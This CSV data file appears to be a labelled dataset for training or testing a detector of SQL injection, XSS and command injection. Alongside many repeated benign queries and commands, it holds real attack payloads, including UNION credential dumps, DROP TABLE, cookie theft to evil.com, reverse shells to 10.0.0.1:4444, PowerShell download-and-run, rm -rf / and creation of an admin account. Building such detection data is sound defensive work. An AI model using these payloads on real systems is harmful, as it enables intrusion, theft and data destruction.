id,payload,label
1,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
2,"<div class='user-profile'>Welcome back, {username}!</div>",benign
3,docker run nginx,benign
4,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
5,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
6,git clone https://github.com/user/repo.git,benign
7,npm install express,benign
8,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
9,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
10,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
11,curl -I https://api.example.com/status,benign
12,SELECT price FROM items WHERE id = 209,benign
13,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
14,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
15,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
16,npm install express,benign
17,docker run nginx,benign
18,npm install express,benign
19,docker run nginx,benign
20,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
21,curl -I https://api.example.com/status,benign
22,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
23,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
24,"<div class='user-profile'>Welcome back, {username}!</div>",benign
25,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
26,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
27,curl -I https://api.example.com/status,benign
28,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
29,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
30,docker run nginx,benign
31,npm install express,benign
32,npm install express,benign
33,git clone https://github.com/user/repo.git,benign
34,"<div class='user-profile'>Welcome back, {username}!</div>",benign
35,docker run nginx,benign
36,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
37,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
38,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
39,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
40,SELECT price FROM items WHERE id = 209,benign
41,docker run nginx,benign
42,git clone https://github.com/user/repo.git,benign
43,curl -I https://api.example.com/status,benign
44,npm install express,benign
45,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
46,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
47,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
48,git clone https://github.com/user/repo.git,benign
49,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
50,curl -I https://api.example.com/status,benign
51,SELECT price FROM items WHERE id = 209,benign
52,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
53,"<div class='user-profile'>Welcome back, {username}!</div>",benign
54,curl -I https://api.example.com/status,benign
55,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
56,SELECT price FROM items WHERE id = 209,benign
57,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
58,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
59,npm install express,benign
60,git clone https://github.com/user/repo.git,benign
61,' OR 1=1 ORDER BY 1--,sql_injection
62,'; exec xp_cmdshell('net user'); --,sql_injection
63,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
64,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
65,admin' --,sql_injection
66,'; exec xp_cmdshell('net user'); --,sql_injection
67,'; WAITFOR DELAY '0:0:10'--,sql_injection
68,' OR '1'='1,sql_injection
69,')) OR 1=1--,sql_injection
70,' OR 1=1 ORDER BY 1--,sql_injection
71,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
72,'; WAITFOR DELAY '0:0:10'--,sql_injection
73,' OR 1=1 ORDER BY 1--,sql_injection
74,admin' --,sql_injection
75,' OR 1=1 ORDER BY 1--,sql_injection
76,javascript:alert(document.domain),xss
77,<svg onload=alert(1)>,xss
78,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
79,javascript:alert(document.domain),xss
80,<input onfocus=write(1) autofocus>,xss
81,<svg onload=alert(1)>,xss
82,<input onfocus=write(1) autofocus>,xss
83,javascript:alert(document.domain),xss
84,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
85,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
86,<iframe src='javascript:alert(`xss`)'></iframe>,xss
87,<img src=x onerror=alert('XSS')>,xss
88,<img src=x onerror=alert('XSS')>,xss
89,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
90,<input onfocus=write(1) autofocus>,xss
91,| cat /etc/passwd,cmd_injection
92,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
93,; wget http://malicious.com/shell.php,cmd_injection
94,|| echo 'evil' > script.sh,cmd_injection
95,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
96,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
97,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
98,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
99,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
100,& net user administrator /add,cmd_injection
101,SELECT price FROM items WHERE id = 209,benign
102,git clone https://github.com/user/repo.git,benign
103,docker run nginx,benign
104,curl -I https://api.example.com/status,benign
105,curl -I https://api.example.com/status,benign
106,"<div class='user-profile'>Welcome back, {username}!</div>",benign
107,"<div class='user-profile'>Welcome back, {username}!</div>",benign
108,SELECT price FROM items WHERE id = 209,benign
109,npm install express,benign
110,"<div class='user-profile'>Welcome back, {username}!</div>",benign
111,npm install express,benign
112,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
113,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
114,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
115,git clone https://github.com/user/repo.git,benign
116,git clone https://github.com/user/repo.git,benign
117,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
118,git clone https://github.com/user/repo.git,benign
119,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
120,npm install express,benign
121,curl -I https://api.example.com/status,benign
122,curl -I https://api.example.com/status,benign
123,docker run nginx,benign
124,git clone https://github.com/user/repo.git,benign
125,git clone https://github.com/user/repo.git,benign
126,git clone https://github.com/user/repo.git,benign
127,SELECT price FROM items WHERE id = 209,benign
128,curl -I https://api.example.com/status,benign
129,SELECT price FROM items WHERE id = 209,benign
130,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
131,docker run nginx,benign
132,docker run nginx,benign
133,"<div class='user-profile'>Welcome back, {username}!</div>",benign
134,"<div class='user-profile'>Welcome back, {username}!</div>",benign
135,SELECT price FROM items WHERE id = 209,benign
136,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
137,git clone https://github.com/user/repo.git,benign
138,curl -I https://api.example.com/status,benign
139,curl -I https://api.example.com/status,benign
140,curl -I https://api.example.com/status,benign
141,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
142,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
143,"<div class='user-profile'>Welcome back, {username}!</div>",benign
144,npm install express,benign
145,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
146,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
147,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
148,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
149,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
150,git clone https://github.com/user/repo.git,benign
151,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
152,SELECT price FROM items WHERE id = 209,benign
153,curl -I https://api.example.com/status,benign
154,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
155,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
156,"<div class='user-profile'>Welcome back, {username}!</div>",benign
157,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
158,npm install express,benign
159,npm install express,benign
160,npm install express,benign
161,admin' --,sql_injection
162,'; WAITFOR DELAY '0:0:10'--,sql_injection
163,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
164,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
165,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
166,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
167,'; WAITFOR DELAY '0:0:10'--,sql_injection
168,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
169,'; WAITFOR DELAY '0:0:10'--,sql_injection
170,admin' --,sql_injection
171,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
172,'; exec xp_cmdshell('net user'); --,sql_injection
173,' OR 1=1 ORDER BY 1--,sql_injection
174,')) OR 1=1--,sql_injection
175,"' UNION SELECT username,password FROM admin_users --",sql_injection
176,<script>alert(document.cookie)</script>,xss
177,javascript:alert(document.domain),xss
178,<script>alert(document.cookie)</script>,xss
179,<body onload=alert('XSS')>,xss
180,<iframe src='javascript:alert(`xss`)'></iframe>,xss
181,<iframe src='javascript:alert(`xss`)'></iframe>,xss
182,javascript:alert(document.domain),xss
183,<iframe src='javascript:alert(`xss`)'></iframe>,xss
184,<input onfocus=write(1) autofocus>,xss
185,<script>alert(document.cookie)</script>,xss
186,<iframe src='javascript:alert(`xss`)'></iframe>,xss
187,<img src=x onerror=alert('XSS')>,xss
188,<input onfocus=write(1) autofocus>,xss
189,<img src=x onerror=alert('XSS')>,xss
190,<script>alert(document.cookie)</script>,xss
191,; wget http://malicious.com/shell.php,cmd_injection
192,; wget http://malicious.com/shell.php,cmd_injection
193,; wget http://malicious.com/shell.php,cmd_injection
194,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
195,; rm -rf /,cmd_injection
196,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
197,|| echo 'evil' > script.sh,cmd_injection
198,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
199,| cat /etc/passwd,cmd_injection
200,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
201,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
202,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
203,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
204,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
205,docker run nginx,benign
206,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
207,npm install express,benign
208,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
209,docker run nginx,benign
210,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
211,SELECT price FROM items WHERE id = 209,benign
212,git clone https://github.com/user/repo.git,benign
213,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
214,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
215,SELECT price FROM items WHERE id = 209,benign
216,SELECT price FROM items WHERE id = 209,benign
217,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
218,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
219,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
220,npm install express,benign
221,"<div class='user-profile'>Welcome back, {username}!</div>",benign
222,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
223,SELECT price FROM items WHERE id = 209,benign
224,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
225,npm install express,benign
226,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
227,"<div class='user-profile'>Welcome back, {username}!</div>",benign
228,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
229,curl -I https://api.example.com/status,benign
230,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
231,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
232,curl -I https://api.example.com/status,benign
233,docker run nginx,benign
234,curl -I https://api.example.com/status,benign
235,"<div class='user-profile'>Welcome back, {username}!</div>",benign
236,curl -I https://api.example.com/status,benign
237,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
238,SELECT price FROM items WHERE id = 209,benign
239,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
240,docker run nginx,benign
241,git clone https://github.com/user/repo.git,benign
242,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
243,git clone https://github.com/user/repo.git,benign
244,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
245,npm install express,benign
246,git clone https://github.com/user/repo.git,benign
247,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
248,docker run nginx,benign
249,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
250,SELECT price FROM items WHERE id = 209,benign
251,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
252,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
253,SELECT price FROM items WHERE id = 209,benign
254,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
255,"<div class='user-profile'>Welcome back, {username}!</div>",benign
256,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
257,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
258,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
259,SELECT price FROM items WHERE id = 209,benign
260,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
261,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
262,'; exec xp_cmdshell('net user'); --,sql_injection
263,'; DROP TABLE users; --,sql_injection
264,admin' --,sql_injection
265,'; DROP TABLE users; --,sql_injection
266,"' UNION SELECT username,password FROM admin_users --",sql_injection
267,'; DROP TABLE users; --,sql_injection
268,' OR 1=1 ORDER BY 1--,sql_injection
269,' OR 1=1 ORDER BY 1--,sql_injection
270,'; exec xp_cmdshell('net user'); --,sql_injection
271,admin' --,sql_injection
272,'; exec xp_cmdshell('net user'); --,sql_injection
273,' OR '1'='1,sql_injection
274,'; DROP TABLE users; --,sql_injection
275,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
276,<script>alert(document.cookie)</script>,xss
277,<body onload=alert('XSS')>,xss
278,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
279,<svg onload=alert(1)>,xss
280,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
281,<iframe src='javascript:alert(`xss`)'></iframe>,xss
282,<iframe src='javascript:alert(`xss`)'></iframe>,xss
283,javascript:alert(document.domain),xss
284,<script>alert(document.cookie)</script>,xss
285,<iframe src='javascript:alert(`xss`)'></iframe>,xss
286,<img src=x onerror=alert('XSS')>,xss
287,<img src=x onerror=alert('XSS')>,xss
288,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
289,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
290,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
291,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
292,| cat /etc/passwd,cmd_injection
293,| cat /etc/passwd,cmd_injection
294,| cat /etc/passwd,cmd_injection
295,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
296,& net user administrator /add,cmd_injection
297,; rm -rf /,cmd_injection
298,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
299,& net user administrator /add,cmd_injection
300,& net user administrator /add,cmd_injection
301,git clone https://github.com/user/repo.git,benign
302,curl -I https://api.example.com/status,benign
303,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
304,git clone https://github.com/user/repo.git,benign
305,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
306,SELECT price FROM items WHERE id = 209,benign
307,"<div class='user-profile'>Welcome back, {username}!</div>",benign
308,npm install express,benign
309,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
310,"<div class='user-profile'>Welcome back, {username}!</div>",benign
311,curl -I https://api.example.com/status,benign
312,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
313,git clone https://github.com/user/repo.git,benign
314,SELECT price FROM items WHERE id = 209,benign
315,git clone https://github.com/user/repo.git,benign
316,"<div class='user-profile'>Welcome back, {username}!</div>",benign
317,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
318,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
319,"<div class='user-profile'>Welcome back, {username}!</div>",benign
320,curl -I https://api.example.com/status,benign
321,npm install express,benign
322,git clone https://github.com/user/repo.git,benign
323,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
324,curl -I https://api.example.com/status,benign
325,SELECT price FROM items WHERE id = 209,benign
326,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
327,git clone https://github.com/user/repo.git,benign
328,curl -I https://api.example.com/status,benign
329,"<div class='user-profile'>Welcome back, {username}!</div>",benign
330,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
331,git clone https://github.com/user/repo.git,benign
332,"<div class='user-profile'>Welcome back, {username}!</div>",benign
333,git clone https://github.com/user/repo.git,benign
334,SELECT price FROM items WHERE id = 209,benign
335,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
336,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
